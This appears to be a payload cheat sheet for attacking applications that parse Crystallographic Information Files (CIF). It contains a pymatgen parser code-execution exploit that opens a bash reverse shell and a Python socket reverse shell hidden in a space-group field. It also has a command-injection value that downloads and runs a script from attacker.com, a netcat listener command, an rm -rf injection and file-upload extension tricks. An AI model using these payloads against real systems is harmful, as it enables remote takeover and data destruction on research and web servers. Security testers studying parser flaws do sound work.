# CIF (Crystallographic Information File) Payloads
----

- **CIF File with Embedded Python Reverse Shell: 1**
```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/192.168.10.15/4444 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

- **CIF File with Embedded Python Reverse Shell: 2**
```cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M ';python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.1.100\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')" #'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

- **Malicious CIF File:**
```cif
data_test
_audit_creation_method '$(wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh)'
loop_
_atom_site_label
_atom_site_fract_x
_atom_site_fract_y
_atom_site_fract_z
C 0.1 0.2 0.3
```
Start the listener:

```bash
nc -lnvp 4444 # Start the listener on the attacker side
```


- **Command injection:** If the backend parses the CIF file and interacts with a shell or external commands, inject malicious values
```cif
_cmd_field $(rm -rf /tmp)
```

- **Invalid Data Types:** Break expected numeric or textual fields.
```cif
_numeric_field not_a_number
```

- **File Upload Exploitation:**
```plaintext
malicious.cif%00.png
malicious.png#.cif
```



